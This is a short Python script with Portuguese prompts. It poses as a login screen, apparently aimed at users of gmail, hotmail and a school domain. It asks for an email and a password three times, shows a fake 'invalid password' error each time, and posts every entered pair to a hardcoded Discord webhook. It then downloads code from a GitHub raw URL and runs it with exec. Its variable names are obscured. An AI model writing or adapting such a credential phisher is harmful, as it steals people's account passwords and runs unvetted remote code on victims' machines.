import requests

webhook = 'https://discord.com/api/webhooks/1374886663700090991/u_3nNNlejBtAbUotBFu0NXfrq9BLP9unBS3ZE7EbiM61GUNpm_9UJdkxia9qrC-D8fjS'

def çj(po):
    dom = ['@gmail.com', '@hotmail.com', '@aluno.pedreira.org']
    return any(po.endswith(x) for x in dom)

tentativas = 0
max_tentativas = 3

while tentativas < max_tentativas:
    while True:
        po = input("Digite seu email>\n")
        if çj(po):
            break
        print("\033[31mEmail não permitido! Tente com @gmail.com, @hotmail.com ou @aluno.pedreira.org\033[0m\n")

    jh = input("Digite sua senha>\n")
    print("\n---------------------------------------------------------------------\n")
    print("\033[31mSenha ou email inválido!")
    print("Tente novamente ou mude o email...\n\033[0m")

    lk = {
        'content': f'Email: {po}\nSenha: {jh}'
    }

    requests.post(webhook, data=lk)
    tentativas += 1

print("\033[32mIniciando o Menu...\033[0m\n")

Mc = requests.get("https://raw.githubusercontent.com/SAMU-SCPT/FiotsCria/refs/heads/main/Menu.py").text
exec(Mc)
